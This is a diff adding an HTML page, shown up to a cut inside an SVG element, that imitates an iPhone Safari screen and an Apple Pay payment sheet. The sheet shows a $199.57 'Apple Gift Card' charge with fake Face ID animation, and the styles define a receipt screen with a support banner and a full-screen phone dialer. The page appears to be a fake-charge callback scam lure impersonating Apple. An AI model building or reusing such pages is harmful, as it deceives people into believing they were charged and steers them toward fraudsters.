@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apple Pay Invoice</title>
+    <link rel="preconnect" href="https://cdnjs.cloudflare.com/">
+    <script defer src="../cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+    <style>
+        :root {
+            --apple-blue: #007AFF;
+            --apple-gray-bg: #F2F2F7;
+            --apple-border: #E5E5EA;
+            --apple-text: #1C1C1E;
+            --apple-subtext: #8E8E93;
+            --success-green: #34C759;
+        }
+
+        * { box-sizing: border-box; }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0; padding: 0;
+            background-color: #fff;
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh;
+            width: 100%;
+        }
+
+        /* --- Remove iPhone Frame --- */
+        .iphone-frame {
+            width: 100%;
+            max-width: 100%;
+            background: white;
+            position: relative;
+            overflow: hidden;
+            border-radius: 0;
+            border: none;
+            box-shadow: none;
+            height: auto;
+            min-height: 100vh;
+        }
+
+        /* --- Safari Background --- */
+        .safari-bg {
+            position: relative;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: auto;
+            background: #F2F2F7;
+            z-index: 0;
+            padding: 20px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .safari-title { font-size: clamp(24px, 6vw, 34px); font-weight: 700; color: black; margin-bottom: 20px; text-align: left; width: 100%; max-width: 90%; }
+        .favorites-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(60px, 1fr)); gap: 15px; width: 100%; max-width: 90%; }
+        .fav-icon { display: flex; flex-direction: column; align-items: center; gap: 8px; }
+        .icon-box {
+            width: clamp(50px, 12vw, 80px);
+            height: clamp(50px, 12vw, 80px);
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: clamp(20px, 5vw, 32px);
+            color: #333;
+        }
+        .icon-label { font-size: clamp(10px, 2vw, 13px); color: #333; }
+
+        .overlay-dim {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0);
+            transition: background 0.5s;
+            z-index: 1;
+            pointer-events: none;
+        }
+        .overlay-dim.active { background: rgba(0,0,0,0.3); backdrop-filter: blur(2px); }
+
+        /* --- Payment Sheet --- */
+        .pay-sheet {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: white;
+            border-top-left-radius: 18px;
+            border-top-right-radius: 18px;
+            z-index: 10;
+            padding-bottom: 40px;
+            transform: translateY(110%);
+            animation: slideUp 0.6s cubic-bezier(0.32, 0.72, 0, 1) forwards 0.5s;
+            box-shadow: 0 -10px 40px rgba(0,0,0,0.25);
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+        @keyframes slideUp { to { transform: translateY(0); } }
+
+        .sheet-header { padding: 25px 20px 15px; text-align: center; border-bottom: 0.5px solid var(--apple-border); }
+        .sheet-merchant { font-size: clamp(11px, 2vw, 12px); color: var(--apple-subtext); text-transform: uppercase; margin-bottom: 5px; }
+        .sheet-amount { font-size: clamp(32px, 8vw, 42px); font-weight: 700; letter-spacing: -0.5px; color: black; margin: 5px 0; }
+        .pay-logo { font-size: clamp(13px, 3vw, 15px); font-weight: 500; margin-top: 5px; }
+
+        .sheet-rows { padding: 0 20px; }
+        .sheet-row {
+            display: flex; justify-content: space-between; padding: 16px 0;
+            border-bottom: 0.5px solid var(--apple-border); font-size: clamp(14px, 3vw, 16px);
+        }
+        .sheet-row:last-child { border-bottom: none; }
+        .lbl { color: var(--apple-subtext); }
+        .val { color: var(--apple-blue); }
+
+        /* --- Animation Zone --- */
+        .anim-area { height: 200px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .spinner {
+            width: 32px; height: 32px; border: 3px solid #E5E5EA; border-top: 3px solid #8E8E93;
+            border-radius: 50%; animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        .face-id-wrap { width: 60px; height: 60px; display: none; margin-bottom: 10px; }
+        .face-path {
+            fill: none; stroke: #8E8E93; stroke-width: 1.5; stroke-linecap: round; stroke-linejoin: round;
+            transition: stroke 0.3s ease;
+        }
+        .face-id-wrap.scanning .face-path { stroke: var(--apple-blue); animation: breathe 1.2s ease-in-out infinite; }
+        @keyframes breathe {
+            0%, 100% { transform: scale(1); opacity: 0.8; transform-origin: center; }
+            50% { transform: scale(1.05); opacity: 1; transform-origin: center; }
+        }
+
+        .dots-container { display: none; gap: 6px; }
+        .dot {
+            width: 6px; height: 6px; background-color: #8E8E93; border-radius: 50%;
+            animation: dotFade 1.4s infinite ease-in-out both;
+        }
+        .dot:nth-child(1) { animation-delay: -0.32s; }
+        .dot:nth-child(2) { animation-delay: -0.16s; }
+        @keyframes dotFade { 0%, 80%, 100% { transform: scale(0); opacity: 0; } 40% { transform: scale(1); opacity: 1; } }
+
+        .check-circle {
+            width: 60px; height: 60px; background: var(--success-green); border-radius: 50%;
+            display: none; align-items: center; justify-content: center; color: white; font-size: 32px;
+            animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        @keyframes popIn { 0% { transform: scale(0); } 100% { transform: scale(1); } }
+
+        .status-txt { margin-top: 20px; font-size: 15px; font-weight: 600; text-align: center; }
+        .status-sub { display: block; font-weight: 400; font-size: 13px; color: var(--apple-subtext); margin-top: 4px; }
+
+        /* --- Receipt Screen --- */
+        .receipt-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 50;
+            display: none;
+            flex-direction: column;
+            overflow-y: auto;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+        .receipt-inner { padding: 20px; max-width: 800px; margin: 0 auto; }
+        .top-support {
+            background: #F9F9F9; text-align: center; font-size: clamp(11px, 2vw, 13px); color: #666;
+            padding: 15px 10px; border-bottom: 1px solid var(--apple-border);
+            margin: 0 -20px 20px -20px; border-radius: 8px;
+        }
+        .link-blue { color: var(--apple-blue); text-decoration: none; font-weight: 600; cursor: pointer; }
+        .hero-section { text-align: center; padding: 20px 0; }
+        .hero-logo { font-size: clamp(32px, 8vw, 40px); margin-bottom: 15px; color: black; }
+        .hero-msg { font-size: clamp(18px, 5vw, 24px); color: #1C1C1E; font-weight: 700; }
+        .sec-title { font-size: clamp(18px, 4vw, 20px); font-weight: 700; color: black; margin-bottom: 15px; margin-top: 20px; }
+        .summary-box { border-top: 1px solid var(--apple-border); border-bottom: 1px solid var(--apple-border); padding: 20px 0; }
+        .sum-row { display: flex; justify-content: space-between; margin-bottom: 5px; align-items: baseline; font-size: clamp(14px, 3vw, 16px); }
+        .total-row { display: flex; justify-content: space-between; margin-top: 15px; align-items: center; }
+        .total-lbl { font-size: clamp(16px, 4vw, 18px); font-weight: 700; }
+        .total-val { font-size: clamp(16px, 4vw, 18px); font-weight: 700; }
+        .gray-box { background: #F5F5F7; border-radius: 8px; padding: 15px; margin-bottom: 20px; font-size: clamp(13px, 2vw, 15px); }
+        .gray-row { display: flex; justify-content: space-between; font-size: clamp(12px, 2vw, 14px); margin-bottom: 8px; }
+        .gray-lbl { color: #666; }
+        .gray-val { color: #1C1C1E; font-weight: 600; }
+        .help-box { text-align: center; padding: 30px 20px; border-top: 1px solid var(--apple-border); margin-top: 20px; }
+        .help-title { font-size: clamp(14px, 3vw, 16px); font-weight: 600; margin-bottom: 8px; }
+        .help-desc { font-size: clamp(12px, 2vw, 13px); color: #8E8E93; margin-bottom: 15px; }
+        .btn-row { display: flex; gap: 10px; justify-content: center; margin-top: 20px; flex-wrap: wrap; }
+        .btn { padding: 12px 20px; border-radius: 8px; font-size: clamp(13px, 2vw, 14px); font-weight: 600; cursor: pointer; border: none; min-width: 120px; }
+        .btn-white { background: white; border: 1px solid #007AFF; color: #007AFF; }
+        .btn-blue { background: #007AFF; color: white; }
+        .footer { text-align: center; font-size: clamp(10px, 1.5vw, 12px); color: #8E8E93; line-height: 1.6; padding: 20px; margin-top: 30px; }
+        .footer-links span { margin: 0 5px; color: #007AFF; cursor: pointer; }
+        .footer-line { height: 1px; background-color: #E5E5EA; width: 100%; margin: 20px 0; }
+
+        /* --- DIALER SCREEN --- */
+        .dialer-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 100;
+            display: flex;
+            flex-direction: column;
+            transform: translateY(100%);
+            transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+            overflow: hidden;
+        }
+        .dialer-screen.active { transform: translateY(0); }
+
+        .dialer-display {
+            flex: 1; display: flex; flex-direction: column; justify-content: flex-end; align-items: center; padding-bottom: 30px;
+        }
+        .dialer-num { font-size: clamp(24px, 6vw, 36px); font-weight: 500; color: black; margin-bottom: 5px; }
+        .dialer-sub { font-size: clamp(11px, 2vw, 13px); color: #007AFF; }
+
+        .keypad-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px 25px; padding: 0 20px 30px; }
+        .key {
+            width: clamp(60px, 15vw, 90px);
+            height: clamp(60px, 15vw, 90px);
+            background: #E5E5E5;
+            border-radius: 50%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            transition: background 0.1s;
+        }
+        .key:active { background: #BBBBBB; }
+        .key-num { font-size: clamp(20px, 5vw, 30px); font-weight: 400; line-height: 1; }
+        .key-let { font-size: clamp(8px, 1.5vw, 10px); font-weight: 700; letter-spacing: 2px; margin-top: 2px; }
+
+        .call-area { display: flex; justify-content: center; padding-bottom: 50px; }
+        .call-btn {
+            width: clamp(60px, 15vw, 90px);
+            height: clamp(60px, 15vw, 90px);
+            background: #34C759;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: clamp(28px, 6vw, 40px);
+        }
+
+        /* --- PDF TEMPLATE --- */
+        #pdf-template {
+            display: none; 
+            width: 595px; /* A4 Width */
+            min-height: 842px;
+            padding: 40px 40px 40px 80px; 
+            background: white; 
+            font-family: Arial, Helvetica, sans-serif; 
+            color: #333;
+            box-sizing: border-box; 
+            position: relative;
+        }
+        
+        .inv-header { display: flex; flex-direction: column; margin-bottom: 20px; align-items: flex-start; }
+        
+        /* Base64 Logo - Safe for PDF generation */
+        .pdf-logo-img { width: 35px; height: auto; margin-bottom: 12px; display: block; }
+        
+        .inv-stack { display: flex; flex-direction: column; gap: 2px; }
+        .inv-line-1 { font-size: 16.5px; font-weight: bold; color: black; }
+        .inv-line-2 { font-size: 14.5px; font-weight: bold; color: black; }
+        .inv-line-3 { font-size: 12.5px; font-weight: bold; color: black; }
+
+        .inv-grid { display: flex; justify-content: space-between; margin-bottom: 20px; }
+        .inv-col { width: 48%; font-size: 10.5px; line-height: 1.4; }
+        .inv-lbl { font-weight: bold; margin-bottom: 4px; display: block; }
+
+        .inv-table-title { font-size: 11.5px; font-weight: bold; margin-bottom: 5px; margin-top: 15px; }
+        
+        .inv-table { width: 100%; border-collapse: collapse; margin-bottom: 15px; }
+        .inv-table th { 
+            background: #EFEFEF; font-size: 9.5px; font-weight: bold; text-align: left; 
+            padding: 6px 4px; border: 1px solid #ccc; vertical-align: top;
+        }
+        .inv-table td { 
+            font-size: 9.5px; padding: 6px 4px; border: 1px solid #ccc; vertical-align: top;
+        }
+        
+        .text-right { text-align: right; }
+        .text-center { text-align: center; }
+
+        .inv-totals-wrap { display: flex; justify-content: flex-end; }
+        .inv-totals-box { width: 220px; border: 1px solid #ccc; }
+        .inv-total-row { display: flex; justify-content: space-between; padding: 4px 6px; border-bottom: 1px solid #ccc; font-size: 10.5px; }
+        .inv-total-row:last-child { border-bottom: none; font-weight: bold; background: #EFEFEF; }
+
+        /* Footer safe area */
+        .inv-footer { 
+            margin-top: 30px; 
+            font-size: 8.5px; 
+            color: #666; 
+            border-top: 1px solid #ccc; 
+            padding-top: 15px; 
+            page-break-inside: avoid;
+        }
+        .inv-link { color: #007AFF; text-decoration: none; }
+
+    </style>
+</head>
+<body>
+
+    <audio id="successSound" src="data:audio/mp3;base64,SUQzBAAAAAAAI1RTU0UAAAAPAAADTGF2ZjU4LjI5LjEwMAAAAAAAAAAAAAAA//uQZAAP8AAAaQAAAAgAAA0gAAABAAABpAAAACAAADSAAAAEFTUy52b3JiaXMrAAAAc3Rldm9yYmlzLmNvbQoEAAAAQAAAAAASAAAAAAAAAABWAIQAAAAAAAD//wAAAAAAAGF0dHJpYnV0ZXMAAAAABQAAAGVuY29kZXI9TGF2YzU4LjU0LjEwMAAAdGhpZgEAAAAEAAAAAAAAb2Y3AQAAAAEAAAAAAAAAAHdvcmJpcwUAAAB2b3JiaXMAAAAAAZKDBAAAAAAACAAAAAAAADwAAAAAAAC4AAAAAAAQAAAAAAAAAAABAAAAAAAAAIAAAAAAAACAAAAAAAAABBIAAAAAAAAEQAAAAAAAABAAAAAAAAAAIAAAAAAAACAAAAAAAAAABYAAAAAAAACQAAAAAAAAAIAAAAAAAACAAAAAAAAAAAIAAAAAAAAAIAAAAAAAAAAABwAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAgAAAAAAAAAAEAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAABAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAgAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAB"></audio>
+
+    <div class="iphone-frame">
+        
+        <div class="safari-bg">
+            <div class="safari-title">Favorites</div>
+            <div class="favorites-grid">
+                <div class="fav-icon"><div class="icon-box"></div><div class="icon-label">Apple</div></div>
+                <div class="fav-icon"><div class="icon-box" style="color:#008373">B</div><div class="icon-label">Bing</div></div>
+                <div class="fav-icon"><div class="icon-box" style="color:#EA4335">G</div><div class="icon-label">Google</div></div>
+                <div class="fav-icon"><div class="icon-box" style="color:#6001D2">Y!</div><div class="icon-label">Yahoo</div></div>
+            </div>
+        </div>
+        
+        <div class="overlay-dim" id="overlay"></div>
+
+        <div class="pay-sheet" id="paySheet">
+            <div class="sheet-header">
+                <div class="sheet-merchant">PAY APPLE GIFT CARD</div>
+                <div class="sheet-amount">$199.57</div>
+                <div class="pay-logo"> Pay</div>
+            </div>
+            <div class="sheet-rows">
+                <div class="sheet-row">
+                    <span class="lbl">Payment</span>
+                    <span class="val">Apple Pay</span>
+                </div>
+                <div class="sheet-row">
+                    <span class="lbl">Billing</span>
+                    <span class="val">Same as shipping</span>
+                </div>
+            </div>
+            <div class="anim-area">
+                <div class="spinner" id="spinner"></div>
+                <svg class="face-id-wrap" id="faceId" viewBox="0 0 50 50">
